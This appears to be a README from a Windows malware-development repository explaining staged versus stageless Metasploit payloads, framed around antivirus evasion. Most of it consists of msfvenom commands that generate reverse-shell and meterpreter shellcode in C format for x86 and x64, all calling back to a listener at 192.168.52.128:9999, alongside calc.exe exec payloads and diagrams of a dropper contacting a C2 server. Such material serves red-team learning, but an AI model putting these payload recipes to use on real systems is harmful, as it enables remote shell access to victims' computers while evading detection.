# stageless vs staged
```
It’s a facinating topic when it comes to AV evasion, It brings up the old argument of "Is it better to have more network-based artifacts or host-based?".

Stageless => produced more host based artifacts.
Staged => Produces more network based artifacts.
```
###### 1-stageless
![image](https://github.com/gil01karougbe/WIN-MALWARE-DEV/assets/98090770/219d452e-e6f5-4645-abb3-5907fe2e64bd)

```
---------------------------------------------------------------
                 /shell_reverse_tcp
                 /meterpreter_reverse_tcp
---------------------------------------------------------------
A stagless payload contains everything in it. Because of this, it size is typically much larger and the program is relatively complex compared to a staged payload.
```
msfvenom!!!
```sh
###reverse tcp
msfvenom -a x86 --platform windows -p windows/shell_reverse_tcp LHOST=192.168.52.128 LPORT=9999 -f c
###meterpreter
msfvenom -a x86 --platform windows -p windows/meterpreter_reverse_tcp  LHOST=192.168.52.128 LPORT=9999 -f c
```

###### 2-staged
![image](https://github.com/gil01karougbe/WIN-MALWARE-DEV/assets/98090770/13b89719-42eb-4b0a-9f27-2dd2cff501d4)

```
---------------------------------------------------------------
                 /shell/reverse_tcp
                 /meterpreter/reverse_tcp
---------------------------------------------------------------
In the diagram above, The victim runs the dropper(First Part), which beacons out to the attacker's C2 server to recieve a second stage which is then injected and executed in memory.
=> This is how staged payload works, the idea to get here is that a staged payload has multiple parts.
```
msfvenom!!!
```sh
###reverse tcp
msfvenom -a x86 --platform windows -p windows/shell/reverse_tcp LHOST=192.168.52.128 LPORT=9999 -f c
###meterpreter
msfvenom -a x86 --platform windows -p windows/meterpreter/reverse_tcp  LHOST=192.168.52.128 LPORT=9999 -f c
```
###### 3-arch
```sh
msfvenom -a x64 --platform windows -p windows/x64/exec cmd=calc.exe  -f c
```
![image](https://github.com/gil01karougbe/WIN-MALWARE-DEV/assets/98090770/35fa7c6b-397a-4a02-8a3e-741ba8ef2f1e)

```sh
msfvenom -a x86 --platform windows -p windows/exec cmd=calc.exe  -f c
```
![image](https://github.com/gil01karougbe/WIN-MALWARE-DEV/assets/98090770/83cba161-484f-4467-8855-ac8fcacdc2da)

```sh
msfvenom -a x64 --platform windows -p windows/x64/shell_reverse_tcp LHOST=192.168.52.128 LPORT=9999 -f c
```
![image](https://github.com/gil01karougbe/WIN-MALWARE-DEV/assets/98090770/229579cf-b7bf-4769-bc0e-229236289269)

```sh
msfvenom -a x86 --platform windows -p windows/shell_reverse_tcp LHOST=192.168.52.128 LPORT=9999 -f c
```
![image](https://github.com/gil01karougbe/WIN-MALWARE-DEV/assets/98090770/6d75d9a8-2a50-476a-a71a-bdb988c2b305)

